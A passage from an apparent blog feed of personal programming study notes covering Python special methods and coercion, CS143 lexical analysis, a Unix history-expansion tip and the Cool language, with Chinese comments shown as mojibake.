if it does not provide a <code>_bool_</code> method. Empty sequences are false, while non-empty sequences are true:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">bool</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-literal">False</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">bool</span>([])<br><span class="hljs-literal">False</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-built_in">bool</span>(<span class="hljs-string">&#x27;Go Bears!&#x27;</span>)<br><span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>The <code>_getitem_</code> method is invoked by the element selection operator, but it can also be invoked directly:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;Go Bears!&#x27;</span>[<span class="hljs-number">3</span>]<br><span class="hljs-string">&#x27;B&#x27;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-string">&#x27;Go Bears!&#x27;</span>.__getitem__(<span class="hljs-number">3</span>)<br><span class="hljs-string">&#x27;B&#x27;</span><br></code></pre></td></tr></table></figure><p>Using <code>_call_</code> method we can define a class that behaves like functions:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&gt;&gt;&gt; <span class="hljs-keyword">class</span> <span class="hljs-title class_">Adder</span>(object):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, n</span>):<br>            <span class="hljs-variable language_">self</span>.n = n<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">__call__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, k</span>):<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.n + k<br><br>&gt;&gt;&gt; add_three_obj = Adder(<span class="hljs-number">3</span>)<br>&gt;&gt;&gt; add_three_obj(<span class="hljs-number">4</span>)<br><span class="hljs-number">7</span><br></code></pre></td></tr></table></figure><h3 id="2-7-3-Multiple-Representations"><a href="#2-7-3-Multiple-Representations" class="headerlink" title="2.7.3 Multiple Representations"></a>2.7.3 Multiple Representations</h3><p>How numbers can be added or multiplied is abstracted by the method names add and mul:</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&gt;&gt;&gt; <span class="hljs-keyword">class</span> <span class="hljs-title class_">Number</span>:<br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">__add__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, other</span>):<br>          <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.add(other)<br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">__mul__</span>(<span class="hljs-params"><span class="hljs-variable language_">self</span>, other</span>):<br>          <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.mul(other)<br></code></pre></td></tr></table></figure><p><mark>Special method names</mark><br>å’Œè¡Œä¸ºæŒ‚é’©, æ¯”å¦‚:<code>_add_</code> å’Œ <code>+</code> ç›¸å…³, åš<code>+</code>è¿ç®—æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨<code>_add_</code>.</p><p>An <mark>interface</mark> is a set of shared attribute names, along with a specification of their behavior.</p><p>The <code>@property</code> decorator allows functions to be called without call expression syntax. ä¹Ÿå°±æ˜¯è°ƒç”¨ method æ—¶åé¢ä¸ç”¨åŠ æ‹¬å·.</p><p>Multiple representations of data, ä¹Ÿå°±æ˜¯ä¸€ç§æ•°æ®ç”¨å¤šç§è¡¨ç¤ºæ–¹æ³•.</p><h3 id="2-7-4-Generic-Functions"><a href="#2-7-4-Generic-Functions" class="headerlink" title="2.7.4 Generic Functions"></a>2.7.4 Generic Functions</h3><p>Generic functions are methods or functions that apply to arguments of different types.</p><p>The built-in function <code>isinstance</code> takes an object and a class. It returns true if the object has a class that either is or inherits from the given class.</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">c = ComplexRI(<span class="hljs-number">1</span>, <span class="hljs-number">1</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">isinstance</span>(c, ComplexRI)</span><br>True<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">isinstance</span>(c, Complex)</span><br>True<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">isinstance</span>(c, ComplexMA)</span><br>False<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>type_tag</code> attribute.</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">Rational.type_tag = <span class="hljs-string">&#x27;rat&#x27;</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">Complex.type_tag = <span class="hljs-string">&#x27;com&#x27;</span></span><br></code></pre></td></tr></table></figure><h4 id="Coercion"><a href="#Coercion" class="headerlink" title="Coercion"></a>Coercion</h4><p>Often the different data types are not completely independent, and there may be ways by which objects of one type may be viewed as being of another type. This process is called <mark>coercion</mark>.</p><p>Here is a typical coercion function, which transforms a rational number to a complex number with zero imaginary part:</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">&gt;&gt;&gt; def rational<span class="hljs-constructor">_to_complex(<span class="hljs-params">r</span>)</span>:<br>        return <span class="hljs-constructor">ComplexRI(<span class="hljs-params">r</span>.<span class="hljs-params">numer</span><span class="hljs-operator">/</span><span class="hljs-params">r</span>.<span class="hljs-params">denom</span>, 0)</span><br></code></pre></td></tr></table></figure><p>It is not generally possible to coerce an arbitrary data object of each type into all other types.</p><p>This coercion scheme has some advantages over the method of defining explicit cross-type operations.</p><p>Although we still need to write coercion functions to relate the types, we need to write only one function for each pair of types rather than a different function for each set of types and each generic operation.</p><p>Some more sophisticeted coercion schemes do nut just try to coerce one type into another, but instead may try to coerce two different types each into a third common type.</p><h2 id="2-8-Efficiency"><a href="#2-8-Efficiency" class="headerlink" title="2.8 Efficiency"></a>2.8 Efficiency</h2><h3 id="2-8-1-Measuring-Efficiency"><a href="#2-8-1-Measuring-Efficiency" class="headerlink" title="2.8.1 Measuring Efficiency"></a>2.8.1 Measuring Efficiency</h3><p>Inspecting how many times <code>fib</code> is called:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">count</span>(<span class="hljs-params">f</span>):<br>      <span class="hljs-keyword">def</span> <span class="hljs-title function_">counted</span>(<span class="hljs-params">*args</span>):<br>          counted.call_count += <span class="hljs-number">1</span><br>          <span class="hljs-keyword">return</span> f(*args)<br>      counted.call_count = <span class="hljs-number">0</span><br>      <span class="hljs-keyword">return</span> counted<br>      &gt;&gt;&gt; fib = count(fib)<br><span class="hljs-meta">&gt;&gt;&gt; </span>fib(<span class="hljs-number">19</span>)<br><span class="hljs-number">4181</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>fib.call_count<br><span class="hljs-number">13529</span><br></code></pre></td></tr></table></figure><h4 id="Space"><a href="#Space" class="headerlink" title="Space"></a>Space</h4><p>The interpreter preserves all active environment and all values and frames referenced by those environments.</p><p>An environment is active if it provides the evaluation context for some expression being evaluated. An environment becomes inactive whenever the function call for which its first frame was ceated finally returns.</p><h3 id="2-8-2-Memoization"><a href="#2-8-2-Memoization" class="headerlink" title="2.8.2 Memoization"></a>2.8.2 Memoization</h3><p>Tree-recursive computational processes can often be made more efficient through memoization.</p><p>A memoized function will store the return value for any arguments it has previously received. å°±æ˜¯ä»¥å‰è®¡ç®—è¿‡çš„å€¼åœ¨ recursive computation ä¸­ä¸ä¼šè¢«è®¡ç®—ç¬¬äºŒæ¬¡.</p><h3 id="2-8-3-Orders-of-Growth"><a href="#2-8-3-Orders-of-Growth" class="headerlink" title="2.8.3 Orders of Growth"></a>2.8.3 Orders of Growth</h3><h2 id="2-9-Recursive-Objects"><a href="#2-9-Recursive-Objects" class="headerlink" title="2.9 Recursive Objects"></a>2.9 Recursive Objects</h2><p>Objects can have other objects as attribute values. When an object of some class has an attribute value of that same class, it is a recursive object.</p><h3 id="2-9-1-Linked-List-Class"><a href="#2-9-1-Linked-List-Class" class="headerlink" title="2.9.1 Linked List Class"></a>2.9.1 Linked List Class</h3><p>The empty list is a special case of a linked list that has no first element or rest.</p><p>A linked list is a sequence: it has a finite length and supports element selection by index.</p><p>These bulit-in functions invoke special method names of a class: length is computed by <code>_len_</code> and element selection is computed by <code>_getitem_</code>.</p><h3 id="2-9-3-Sets"><a href="#2-9-3-Sets" class="headerlink" title="2.9.3 Sets"></a>2.9.3 Sets</h3><p>Sets are unordered collections, and so the printed ordering may differ from the element ordering in the set literal.</p><p>Python sets support a vatiety of operations, including membership tests, length computation, and the standard set operations of union and intersection.</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-number">3</span> <span class="hljs-keyword">in</span> s</span><br>True<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">len</span>(s)</span><br>4<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">s.union(&#123;<span class="hljs-number">1</span>, <span class="hljs-number">5</span>&#125;)</span><br>&#123;1, 2, 3, 4, 5&#125;<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">s.intersection(&#123;<span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>&#125;)</span><br>&#123;3, 4&#125;<br><br></code></pre></td></tr></table></figure><p>Sets comparison:</p><ul><li>isdisjoint</li><li>issubset</li><li>issuperset<br>Mutable, change one element at a time:</li><li>add</li><li>remove</li><li>discard</li><li>pop<br>Multi-element mutations:</li><li>clear</li><li>update</li></ul><h1 id="Chapter-3-Interpreting-Computer-Programs"><a href="#Chapter-3-Interpreting-Computer-Programs" class="headerlink" title="Chapter 3: Interpreting Computer Programs"></a>Chapter 3: Interpreting Computer Programs</h1><h2 id="3-1-Introduction"><a href="#3-1-Introduction" class="headerlink" title="3.1 Introduction"></a>3.1 Introduction</h2><h3 id="3-1-1-Programming-Language"><a href="#3-1-1-Programming-Language" class="headerlink" title="3.1.1 Programming Language"></a>3.1.1 Programming Language</h3><h2 id="3-2-Functional-Programming"><a href="#3-2-Functional-Programming" class="headerlink" title="3.2 Functional Programming"></a>3.2 Functional Programming</h2>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CS143 Notes</title>
    <link href="/2022/07/30/CS143-Notes/"/>
    <url>/2022/07/30/CS143-Notes/</url>
    
    <content type="html"><![CDATA[<h1 id="p7-Lexical-Analysis"><a href="#p7-Lexical-Analysis" class="headerlink" title="p7 Lexical Analysis"></a>p7 Lexical Analysis</h1><p>Token classes correspond to sets of strings.</p><p>Identifier: strings of letters of digits, starting with a letter.</p><p>Integer: a non-empty string of digits.</p><p>Keyword:</p><p>Whitespace: a non-empty sequence of blanks, newlines, and tabs.</p><p>Classify program substrings according to role.</p><p>&lt;class,string&gt; è¿™ä¸ªä¸œè¥¿ç§°ä¸º token.</p><p>å¦‚æœæœ‰ä¸€æ®µä»£ç :</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-keyword">if</span>(<span class="hljs-attribute">i</span>==j)<br>  <span class="hljs-attribute">z</span>=0;<br><span class="hljs-keyword">else</span><br>  <span class="hljs-attribute">z</span>=1;<br></code></pre></td></tr></table></figure><p>åœ¨ Lexical Analyser çœ‹æ¥å°±æ˜¯:</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-symbol">\t</span>if(i==j)<span class="hljs-symbol">\n</span><span class="hljs-symbol">\t</span><span class="hljs-symbol">\t</span>z=0;<span class="hljs-symbol">\n</span><span class="hljs-symbol">\t</span>else<span class="hljs-symbol">\n</span><span class="hljs-symbol">\t</span><span class="hljs-symbol">\t</span>z=1;<br></code></pre></td></tr></table></figure><p>Often the punctuation marks of the language are in token classes all by themselves.</p><p>è¿åœ¨ä¸€èµ·çš„ whitespace ä¼šè¢« group ä¸ºä¸€ä¸ª token.</p><p>An implementation must do two things:</p><ol><li>Recognize substrings corresponding to tokens.<ul><li>The lexemes(the substrings are called lexemes)</li></ul></li><li>Identify the token class of each lexeme.</li></ol><p>&lt;token class, lexeme&gt; â€“ a token,</p><h1 id="p8-Lexical-Analysis-Example"><a href="#p8-Lexical-Analysis-Example" class="headerlink" title="p8 Lexical Analysis Example"></a>p8 Lexical Analysis Example</h1><p>FORTRAN rule: Whitespace is insignificant.</p><p><code>VAR1</code> is the same as <code>VA</code>  <code>R1</code>.</p><p>Lookahead, in order to understand the role of something as we are going left to right.</p><p>One of the goal in the design of lexical system is to minimize the amount of lookahead or bound the amount of lookahead that is required.</p><p>é‡ç‚¹:</p><ol><li>The goal is to partition the string. This is implemented by reading left-to-right, recongnizing one token at a time.</li><li>Lookahead may be required to decide where one token ends and the next token begins.</li></ol><h1 id="p9-Regular-Languages"><a href="#p9-Regular-Languages" class="headerlink" title="p9 Regular Languages"></a>p9 Regular Languages</h1><p>Summarize:<br>    - Regular expressions specify regular languages<br>    - Five constructs:<br>        - Two base cases: empty and 1-character strings<br>        - Three compound expressions: union, concatenation, iteration.</p><h1 id="p10-Formal-Languages"><a href="#p10-Formal-Languages" class="headerlink" title="p10 Formal Languages"></a>p10 Formal Languages</h1><p>A formal language is just any set of strings over some alphabet.</p><p>å¦‚:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">Alphabet</span> <span class="hljs-operator">=</span> English<br>characters<br><br><span class="hljs-attribute">Language</span> <span class="hljs-operator">=</span> English<br>sentences<br><br><span class="hljs-attribute">Alphabet</span> <span class="hljs-operator">=</span> ASCII<br><span class="hljs-attribute">Language</span> <span class="hljs-operator">=</span> C programs<br></code></pre></td></tr></table></figure><p>Meaning function L maps syntax to semantics:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">L</span><span class="hljs-params">(e)</span></span> = M<br></code></pre></td></tr></table></figure><p><mark>Meaning is many to one</mark>, syntax å¯¹ semantic æ˜¯å¤šå¯¹ä¸€ã€‚</p><h1 id="p11-Lexical-Specification"><a href="#p11-Lexical-Specification" class="headerlink" title="p11 Lexical Specification"></a>p11 Lexical Specification</h1><p>Whitespace: a non-empty sequences of blanks, newlines, and tabs.</p><h1 id="p12-Lexical-Specification"><a href="#p12-Lexical-Specification" class="headerlink" title="p12 Lexical Specification"></a>p12 Lexical Specification</h1><p>â€œMaximal Munchâ€. å–é•¿çš„ string.</p><p>When there is more than one token class to which a string might belong, é€šè¿‡ä¼˜å…ˆçº§ï¼Œchoose the one listed first.</p><p><mark>If no rule matches:</mark><br>Making a <code>Error</code> regex for all strings not in the lexical specification. And put it last in priority.</p><p><mark>Summarise</mark><br>Regular expressions are a concise notation for string patterns.</p><p>Use in lexical analysis requires small extensions:<br>    - To resolve ambiguities: match as long as possible; highest priority match<br>    - To handle errors</p><h1 id="p13-Finite-Automata"><a href="#p13-Finite-Automata" class="headerlink" title="p13 Finite Automata"></a>p13 Finite Automata</h1>]]></content>
    
    
    <categories>
      
      <category>Compiler Theory</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Using bang in Unix to repeat command</title>
    <link href="/2022/07/29/Using-bang-in-Unix-to-repeat-command/"/>
    <url>/2022/07/29/Using-bang-in-Unix-to-repeat-command/</url>
    
    <content type="html"><![CDATA[<p>ä¸¾ä¸ªä¾‹å­:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>!l<br></code></pre></td></tr></table></figure><p>ä¼šé‡å¤ä¸Šä¸€ä¸ªä»¥<code>l</code>å¼€å¤´çš„å‘½ä»¤ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Cool language Notes</title>
    <link href="/2022/07/29/Cool-language-Notes/"/>
    <url>/2022/07/29/Cool-language-Notes/</url>
    
    <content type="html"><![CDATA[<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">i : <span class="hljs-type">IO</span> &lt;- <span class="hljs-keyword">new</span> IO;<br></code></pre></td></tr></table></figure><p><code>new</code> ç”¨äºåˆ›å»º object , åä¸€ä¸ª<code>IO</code>æ˜¯ objectçš„ç±»å‹ã€‚<code>&lt;-</code> ä¼¼ä¹æ˜¯èµ‹å€¼çš„æ„æ€ã€‚</p><p>ç”¨<code>let ...  in</code>åˆ›å»ºlocal variable.</p><p><code>if then else</code> statement.</p><p>The last statement of the block is the value of the block. è¿™ä¸ªå’Œperlä¸­ä¸€æ ·.</p><p><code>=</code> åœ¨COOLä¸­æ˜¯æ¯”è¾ƒoperator.</p><p>The special value <code>void</code> is a member of all types and is used as the default initialzation for variable. There is no name for void.</p><p><code>isvoid</code> expr, which tests whether a value is void.</p><p>A dispatch to or case on void generates a runtime error.</p><p>A statement o  an expression block has to be included in its own set of curly braces. å¦‚:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">main</span>(): Int &#123; &#123; <span class="hljs-selector-tag">i</span><span class="hljs-selector-class">.out_string</span>(&quot;Hello World!&quot;); <span class="hljs-number">1</span>; &#125; &#125;;<br></code></pre></td></tr></table></figure><p>ç¬¬ä¸€ä¸ª curly braces is the body of the <code>main</code> program, and the second braces means a block of expression.</p><h1 id="6-Method"><a href="#6-Method" class="headerlink" title="6 Method"></a>6 Method</h1><p>The type of the method body must conform to th  declared return type.</p><h1 id="7-Expressions"><a href="#7-Expressions" class="headerlink" title="7 Expressions"></a>7 Expressions</h1><h2 id="7-2-Identifiers"><a href="#7-2-Identifiers" class="headerlink" title="7.2 Identifiers"></a>7.2 Identifiers</h2><p>It is an error to assign to <code>self</code> or bind <code>self</code> in a <code>let</code>, a <code>case</code>, or as a formal parameter.</p><p>It is also illegal to have attributes named self.</p><h2 id="7-4-Dispatch"><a href="#7-4-Dispatch" class="headerlink" title="7.4 Dispatch"></a>7.4 Dispatch</h2><p>å°±æ˜¯ method call.</p><p>The value of the expression is the value returned by the method invocation.</p><p>Inferring accurate static types for dispatch expression is what justifies including SELF_TYPE in the Cool type system.</p><p>Three ways to dispatch:</p><pre><code class="hljs">- &lt;expr&gt;.&lt;id&gt;(&lt;expr&gt;,...,&lt;expr&gt;)- &lt;id&gt;(&lt;expr&gt;,...,&lt;expr&gt;)- &lt;expr&gt;@&lt;type&gt;.id(&lt;expr&gt;,...,&lt;expr&gt;)</code></pre><h2 id="7-5-Conditionals"><a href="#7-5-Conditionals" class="headerlink" title="7.5 Conditionals"></a>7.5 Conditionals</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> &lt;<span class="hljs-built_in">expr</span>&gt; <span class="hljs-keyword">then</span> &lt;<span class="hljs-built_in">expr</span>&gt; <span class="hljs-keyword">else</span> &lt;<span class="hljs-built_in">expr</span>&gt; <span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><p>The predicate is evaluated first, if the predicate is true, then the <code>then</code> branch is evaluated. If the predicate is false, then the <code>else</code> branch is evaluated.</p><h2 id="7-6-Loops"><a href="#7-6-Loops" class="headerlink" title="7.6 Loops"></a>7.6 Loops</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">while</span> &lt;<span class="hljs-built_in">expr</span>&gt; loop &lt;<span class="hljs-built_in">expr</span>&gt; pool<br></code></pre></td></tr></table></figure><p>If the predicate is false, the loop terminates and <code>void</code> is returned.</p><h2 id="7-7-Blocks"><a href="#7-7-Blocks" class="headerlink" title="7.7 Blocks"></a>7.7 Blocks</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&#123; <span class="hljs-tag">&lt;<span class="hljs-name">expr</span>&gt;</span>; ... <span class="hljs-tag">&lt;<span class="hljs-name">expr</span>&gt;</span>; &#125;<br></code></pre></td></tr></table></figure><p>The static type of a block is the static type of the last expression.</p><p><mark>Semi-colons</mark> are used as terminators in lists of expressions and not as expression separators. Semi-colons also terminate other Cool constructs. è¿™å¥è¯çš„æ„æ€æ˜¯ï¼Œæ¯ä¸€ä¸ª semicolon è¡¨ç¤ºä¸€ä¸ª expression çš„ç»“æŸï¼Œç„¶åä¼šæŒ‰é¡ºåºæ‰§è¡Œä¸‹ä¸€ä¸ª expression.</p><p>Block é‡Œé¢çš„æ¯ä¸€ä¸ª expression éƒ½è¦æœ‰ semicolon, body é‡Œé¢åªæœ‰ä¸€ä¸ª expression ä¸”ä¸ç”¨ semicolon.</p><h2 id="7-8-Let"><a href="#7-8-Let" class="headerlink" title="7.8 Let"></a>7.8 Let</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">let</span> <span class="hljs-symbol">&lt;id1&gt;</span>: <span class="hljs-symbol">&lt;type1&gt;</span> [ &lt;- <span class="hljs-symbol">&lt;expr&gt;</span> ], ..., <span class="hljs-symbol">&lt;idn&gt;</span>: <span class="hljs-symbol">&lt;typen&gt;</span> [ &lt;- <span class="hljs-symbol">&lt;exprn&gt;</span> ] in <span class="hljs-symbol">&lt;expr&gt;</span><br></code></pre></td></tr></table></figure><p>The value of the let is the value of the body.</p><p>If an identifier is defined multiple times in a let, later bindings hide earlier ones.</p><h2 id="7-9-Case"><a href="#7-9-Case" class="headerlink" title="7.9 Case"></a>7.9 Case</h2><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xquery"><span class="hljs-keyword">case</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">expr0</span>&gt;</span> of </span><br><span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">id1</span>&gt;</span>: </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">type1</span>&gt;</span> =&gt; </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">expr1</span>&gt;</span>;</span><br><span class="language-xml"></span><br><span class="language-xml">    ...</span><br><span class="language-xml"></span><br><span class="language-xml">    </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">idn</span>&gt;</span>: </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">typen</span>&gt;</span> =&gt; </span><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">exprn</span>&gt;</span>;</span><br><span class="language-xml">esac</span><br></code></pre></td></tr></table></figure><p>The result of the case is the value of <exprk>.</p><p><code>case</code> æ˜¯æ ¹æ®<code>&lt;expr0&gt;</code> å’Œ <code>&lt;idn&gt;</code> çš„ <code>type</code> æ¥å†³å®šæ˜¯å¦æ‰§è¡Œã€‚</p><h2 id="7-10-New"><a href="#7-10-New" class="headerlink" title="7.10 New"></a>7.10 New</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">isvoid <span class="hljs-built_in">expr</span><br></code></pre></td></tr></table></figure><h2 id="7-12-Arithmetic-and-Comparison-Operations"><a href="#7-12-Arithmetic-and-Comparison-Operations" class="headerlink" title="7.12 Arithmetic and Comparison Operations"></a>7.12 Arithmetic and Comparison Operations</h2><p>Four binary arithmetic operations: +, -, *, &#x2F;.</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">expr1 <span class="hljs-tag">&lt;<span class="hljs-name">op</span>&gt;</span> expr2<br></code></pre></td></tr></table></figure><p>The static types of the two sub-expression must be <code>Int</code>. The static type of the expression is <code>Int</code>. Cool has only integer division.</p><p>Cool has only three comparison operations: &lt;, &lt;&#x3D;, &#x3D;.</p><p>The expression <code>~&lt;expr&gt;</code> is the integer complement of <expr>.</p><p>The expression <code>not &lt;expr&gt;</code> is the boolean complement of <expr>.</p><h1 id="8-Basic-Classes"><a href="#8-Basic-Classes" class="headerlink" title="8 Basic Classes"></a>8 Basic Classes</h1><h2 id="8-1-Object"><a href="#8-1-Object" class="headerlink" title="8.1 Object"></a>8.1 Object</h2><p>The <code>Object</code> class is the root of the inheritance graph.</p><h2 id="8-2-IO"><a href="#8-2-IO" class="headerlink" title="8.2 IO"></a>8.2 IO</h2><p>A class can make use of the methods in the IO class by inheriting from IO. It is an error to redifine the IO class.</p><h2 id="8-3-Int"><a href="#8-3-Int" class="headerlink" title="8.3 Int"></a>8.3 Int</h2><p>The default initilization for variables of type Int is 0(not void).</p><h2 id="8-4-String"><a href="#8-4-String" class="headerlink" title="8.4 String"></a>8.4 String</h2><p>The default initilization for variables of type String is â€œâ€(not void).</p><h2 id="8-5-Bool"><a href="#8-5-Bool" class="headerlink" title="8.5 Bool"></a>8.5 Bool</h2><p>The Bool class provides <code>true</code> and <code>dault</code>. The default initilization for variables of type Bool is false(not void).</p><h1 id="9-Main-Class"><a href="#9-Main-Class" class="headerlink" title="9 Main Class"></a>9 Main Class</h1><p>Every program  must have a class <code>Main</code>. The <code>Main</code> class must have a method <code>main</code> that takes no formal parameters. The <code>main</code> method must be defined in class <code>Main</code>. </p><h1 id="10-Lexical-Structure"><a href="#10-Lexical-Structure" class="headerlink" title="10 Lexical Structure"></a>10 Lexical Structure</h1><p>The lexical units of Cool are integers, type identifiers, object identifiers, special notation, strings, key-words, and white space.</p><h2 id="10-2-Strings"><a href="#10-2-Strings" class="headerlink" title="10.2 Strings"></a>10.2 Strings</h2><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-comment">&quot;This \</span><br><span class="hljs-keyword">is</span> OK<span class="hljs-comment">&quot;</span><br></code></pre></td></tr></table></figure><p>A string may not contain EOF, A string may not contain the null(character \0).</p><h2 id="10-3-Comments"><a href="#10-3-Comments" class="headerlink" title="10.3 Comments"></a>10.3 Comments</h2><p>There are two forms of comments:</p><pre><code class="hljs"> --(*...*)</code></pre><h1 id="11-Cool-Syntax"><a href="#11-Cool-Syntax" class="headerlink" title="11 Cool Syntax"></a>11 Cool Syntax</h1><h1 id="12-Type-Rules"><a href="#12-Type-Rules" class="headerlink" title="12 Type Rules"></a>12 Type Rules</h1><h2 id="12-1-Type-Environments"><a href="#12-1-Type-Environments" class="headerlink" title="12.1 Type Environments"></a>12.1 Type Environments</h2><p>Three parts: a method environment M, an object environment O, and the name of the current class in which the expression appears. The method environment and object environment are both functions(also called mappings).</p><h2 id="12-2-Type-Checking-Rules"><a href="#12-2-Type-Checking-Rules" class="headerlink" title="12.2 Type Checking Rules"></a>12.2 Type Checking Rules</h2><h1 